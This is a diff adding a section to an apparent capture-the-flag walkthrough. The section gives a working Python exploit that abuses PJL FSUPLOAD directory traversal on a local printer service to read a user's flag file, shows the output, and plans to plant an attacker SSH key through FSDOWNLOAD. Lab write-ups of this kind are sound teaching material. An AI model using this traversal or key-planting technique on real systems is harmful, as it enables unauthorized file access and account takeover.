@@ -633,6 +633,52 @@ LISTEN [::]:22
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.2 Read `user.txt` via PJL directory traversal (`FSUPLOAD`)
+
+**Why this step:** Internal enumeration found a JetDirect/PJL service on `127.0.0.1:9100`. PJL exposes a filesystem interface; testing it with a traversal path both proves the vulnerability and retrieves the user flag.
+
+**Command (on target, via Python since `nc` is absent):**
+
+```bash
+python3 -c '
+import socket
+s=socket.socket()
+s.connect(("127.0.0.1",9100))
+s.send(b"@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\n")
+print(s.recv(4096).decode(errors="ignore"))
+s.close()
+'
+```
+
+**Breakdown:**
+
+- `socket.connect(("127.0.0.1",9100))`: open a raw TCP connection to the loopback PJL service.
+- `@PJL FSUPLOAD NAME="..."`: PJL command that uploads (reads back) a file from the device filesystem to the client.
+- `../../../../`: directory traversal escaping the printer's virtual filesystem root to the host root.
+- `home/archivist/user.txt`: the target file, unreadable by `lp` directly.
+
+**Result:**
+
+```
+@PJL FSUPLOAD NAME="../../../../home/archivist/user.txt" SIZE=33
+5481d28c73af2c2697456a2dc9296d7d
+```
+
+**What this gives you:**
+
+- Key finding: the PJL `FSUPLOAD` command is vulnerable to directory traversal, granting arbitrary file read as the `archivist`-owned (or higher) service context.
+- Retrieved `user.txt`, confirming the read primitive before weaponizing the matching write primitive.
+
+**Next:** Use the PJL `FSDOWNLOAD` command to write an attacker SSH public key into `archivist`'s `authorized_keys`, then log in over SSH.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
